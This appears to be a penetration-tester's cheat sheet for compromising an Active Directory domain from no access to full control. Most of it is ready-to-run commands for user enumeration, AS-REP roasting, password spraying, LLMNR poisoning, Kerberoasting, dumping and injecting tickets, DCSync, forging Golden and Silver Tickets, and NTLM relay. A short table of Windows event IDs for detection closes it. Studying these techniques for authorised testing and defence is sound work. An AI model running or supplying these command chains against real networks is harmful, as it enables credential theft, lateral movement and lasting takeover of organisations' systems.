## Step 0 — Reconnaissance (No Access)

Goal: find valid usernames before you have any credentials.

```bash
# Username enumeration via Kerberos
kerbrute userenum -d domain.local --dc DC_IP usernames.txt

# Kerbrute confirms valid usernames via Kerberos error responses
# Valid user   → KDC returns "preauthentication required"
# Invalid user → KDC returns "user does not exist"
````

---
## Step 1 — Initial Foothold (No Creds)

### AS-REP Roasting (Unauthenticated)

Target accounts with preauthentication disabled.

```bash
# Request AS-REP without credentials
impacket-GetNPUsers domain.local/ -usersfile valid_users.txt -dc-ip DC_IP -no-pass -format hashcat

# Crack
hashcat -m 18200 hashes.txt rockyou.txt -r best64.rule
```

### Password Spraying

Try one common password against all valid usernames — avoids lockout.

```bash
kerbrute passwordspray -d domain.local --dc DC_IP valid_users.txt Password2024!
```

### LLMNR/NBT-NS Poisoning

Capture NetNTLM hashes from broadcast traffic on the local network.

```bash
# Poison broadcasts, capture hashes
sudo responder -I eth0 -v

# Crack captured NetNTLM hash
hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule
```

---
## Step 2 — Authenticated Enumeration (Have Low Priv Creds)

Once you have any domain user credentials, enumerate everything.

```bash
# Find AS-REP roastable accounts
impacket-GetNPUsers domain.local/user:pass -dc-ip DC_IP -format hashcat

# Find Kerberoastable accounts (SPNs on user accounts)
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP

# Enumerate shares
impacket-smbclient domain.local/user:pass@DC_IP

# Enumerate users, groups, policies
enum4linux-ng -A DC_IP -u user -p pass

# BloodHound — map entire AD attack paths
bloodhound-python -d domain.local -u user -p pass -dc DC_IP -c all
```

---
## Step 3 — Kerberoasting (Authenticated)

Target service accounts with SPNs — crack their password hashes offline.

```bash
# Find and dump TGS hashes
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request

# Crack
hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule
```

---
## Step 4 — Lateral Movement (Have Service Account Creds)

Use cracked credentials to move to other machines.

```bash
# Check if account is local admin anywhere (BloodHound shows this)
# Try common remote access methods:

# WinRM
evil-winrm -i TARGET_IP -u svc_mssql -p Summer2024!

# SMB/PSExec (needs local admin)
impacket-psexec domain.local/svc_mssql:Summer2024!@TARGET_IP

# SMB
impacket-smbexec domain.local/svc_mssql:Summer2024!@TARGET_IP
```

---
## Step 5 — Pass the Ticket (Have Shell on Machine)

Steal TGT or TGS tickets from memory and inject them into your session.

### Why

```
Stolen TGT → authenticate as victim user to any service
Stolen TGS → authenticate as victim user to specific service
No password needed — ticket IS the authentication
```

### Dump Tickets from Memory

```bash
# On Windows — Rubeus
Rubeus.exe triage              # list all tickets in memory
Rubeus.exe dump /user:admin    # dump specific user ticket

# Mimikatz
sekurlsa::tickets /export      # exports all tickets as .kirbi files
```

### Inject Stolen Ticket

```bash
# Rubeus — inject ticket into current session
Rubeus.exe ptt /ticket:ticket.kirbi

# Mimikatz
kerberos::ptt ticket.kirbi

# Verify injection worked
klist    # shows tickets currently in your session
```

### Use the Ticket

```bash
# Now access resources as the victim user
dir \\TARGET\C$
psexec \\TARGET cmd.exe
```

### From Linux (impacket)

```bash
# Export ticket and convert to ccache format
# Then use with impacket tools
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain.local/admin@TARGET_IP
```

---
## Step 6 — Privilege Escalation (Need Higher Privs)

### Dump Local Credentials

```bash
# If you have local admin on a machine
impacket-secretsdump domain.local/user:pass@TARGET_IP

# Look for:
# → Domain Admin credentials cached locally
# → Service account credentials
# → Machine account hashes
```

### BloodHound Attack Paths

```
Open BloodHound
→ "Shortest path to Domain Admin"
→ follow the edges:
   HasSession       → admin is logged into this machine, steal their ticket
   AdminTo          → you are local admin here, dump creds
   MemberOf         → group membership giving you extra rights
   GenericAll        → full control over an object
   WriteDACL        → modify permissions on an object
   ForceChangePassword → reset someone's password
```

---
## Step 7 — DCSync (Have Domain Admin)

Pretend to be a DC and request all password hashes from the real DC.

```bash
# Dump everything including krbtgt
impacket-secretsdump domain.local/Administrator:pass@DC_IP

# Or target krbtgt specifically
mimikatz → lsadump::dcsync /user:krbtgt
```

You now have:

```
krbtgt hash      → Golden Ticket
All user hashes  → Pass the Hash on anything
All machine hashes → lateral movement everywhere
```

---
## Step 8 — Golden Ticket (Have krbtgt Hash)

Forge a TGT as any user with any privileges. Persistence even after password resets.

```bash
# Mimikatz — forge Golden Ticket
kerberos::golden /user:FakeAdmin /domain:domain.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt

# Rubeus
Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:DOMAIN_SID /user:FakeAdmin /ptt
```

What you need:

```
krbtgt hash    → from DCSync
Domain SID     → whoami /user (or BloodHound)
Any username   → real or fake, does not matter
Domain name    → domain.local
```

Ticket is injected directly into memory — now access anything as Domain Admin.

---
## Step 9 — Silver Ticket (Have Service Account Hash)

Forge a TGS for a specific service. Stealthier than Golden Ticket — KDC not involved at all.

```bash
# Mimikatz
kerberos::silver /user:Administrator /domain:domain.local /sid:DOMAIN_SID /target:SERVER /service:cifs /rc4:SERVICE_HASH /ptt
```

What you need:

```
Service account hash   → from secretsdump or mimikatz
Domain SID             → whoami /user
Target server          → which machine runs the service
Service type           → cifs (SMB), http, mssql, host etc
```

More limited than Golden Ticket — only works for that specific service on that specific machine. But generates zero KDC traffic — much harder to detect.

---
## Step 10 — NTLM Relay (Network Position)

Intercept NetNTLM authentication and relay it to another target in real time. No cracking needed — forward the auth as it happens.

```bash
# Step 1 — disable SMB signing check first
nmap --script smb-security-mode -p445 TARGET_RANGE

# Step 2 — set up relay
impacket-ntlmrelayx -tf targets.txt -smb2support

# Step 3 — trigger authentication (poison broadcasts)
sudo responder -I eth0 -v --lm

# When victim authenticates:
# → Responder captures it
# → ntlmrelayx forwards it to targets.txt machines
# → if victim is local admin on target → shell or SAM dump
```

---
## Full Attack Chain Summary

```
No access
→ Kerbrute enumerate users
→ AS-REP roast unauthenticated accounts
→ LLMNR poisoning → capture NetNTLM → crack
→ Password spray

Low priv user
→ BloodHound enumerate everything
→ Kerberoast service accounts → crack
→ NTLM relay if network position available

Service account / local admin
→ Dump local creds (secretsdump)
→ Pass the Hash / Pass the Ticket
→ Lateral movement via WinRM / PSExec / SMB

Domain Admin
→ DCSync → dump krbtgt + all hashes
→ Golden Ticket → permanent persistence
→ Silver Ticket → stealthy service access
→ Own entire forest via Enterprise Admin
```

---
## Detection Summary (SOC)

|Attack|Event ID|What to Look For|
|---|---|---|
|AS-REP Roasting|4768|RC4 encryption requests, accounts that never log in|
|Kerberoasting|4769|RC4 TGS requests for service accounts|
|Pass the Ticket|4768/4769|Ticket used from unusual IP or machine|
|Golden Ticket|4768|TGT with anomalous validity period or fake username|
|Silver Ticket|No KDC event|Only service-side logs — KDC never sees it|
|DCSync|4662|Replication rights used by non-DC account|
|NTLM Relay|4624|Logon from unexpected source IP|

---
---
